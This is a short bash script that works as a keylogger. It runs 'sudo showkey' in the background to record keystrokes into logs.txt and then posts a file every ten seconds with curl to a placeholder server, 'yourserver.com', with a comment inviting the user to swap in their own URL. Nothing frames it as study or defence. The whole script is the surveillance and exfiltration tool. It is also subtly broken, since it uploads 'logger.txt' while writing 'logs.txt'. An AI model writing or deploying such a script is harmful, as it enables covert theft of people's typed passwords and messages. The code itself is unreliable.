#!/bin/bash

sudo showkey > ./logs.txt &

upload_logs() {
    while true; do
        sleep 10 # Uploads logs every 10 seconds. Adjust as needed.
        if [ -f ./logs.txt ]; then
            curl -X POST -F "file=@./logger.txt" "http://yourserver.com/upload" # Replace with your server URL
        fi
    done
}

upload_logs